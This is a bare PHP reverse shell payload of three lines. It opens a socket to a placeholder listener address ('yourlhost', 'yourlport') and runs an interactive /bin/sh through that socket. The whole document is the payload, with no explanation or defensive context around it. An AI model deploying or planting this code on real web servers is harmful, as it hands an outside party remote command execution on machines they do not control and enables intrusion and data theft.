<?php
$sock=fsockopen("yourlhost",yourlport);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
